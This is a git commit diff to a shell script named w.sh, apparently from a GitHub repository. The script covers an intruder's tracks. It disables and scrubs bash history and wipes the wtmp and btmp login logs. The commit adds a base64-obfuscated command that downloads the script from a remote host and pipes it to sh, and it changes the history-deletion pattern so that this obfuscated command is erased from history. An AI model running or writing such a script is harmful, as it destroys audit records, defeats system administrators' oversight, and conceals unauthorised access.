c5132a0d25f25c3a56c62e0cefb9a882890ecc42
vtela <53336233+vtela@users.noreply.github.com>
2021-05-13 11:28:54 +0800

    Update w.sh

--- w.sh
+++ w.sh
@@ -1,12 +1,12 @@
 #!/bin/sh
-#curl -ssL https://raw.fastgit.org/vtela/h/main/w.sh -o /tmp/w.sh
+#echo Y3VybCAtc3NMIGh0dHBzOi8vcmF3LmZhc3RnaXQub3JnL3Z0ZWxhL2gvbWFpbi93LnNoIC1vIC90bXAvdy5zaAo= | base64 -d |sh
 #source /tmp/w.sh
 /usr/bin/mv -f $HOME/.bash_history{,.bak}
 unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
 export HISTFILE=/dev/null
 export HISTSIZE=0
 export HISTFILESIZE=0
-sed -i '/vtela/,$d' $HOME/.bash_history.bak
+sed -i '/base64/,$d' $HOME/.bash_history.bak
 #清理登录信息
 > /var/log/wtmp
 > /var/log/btmp
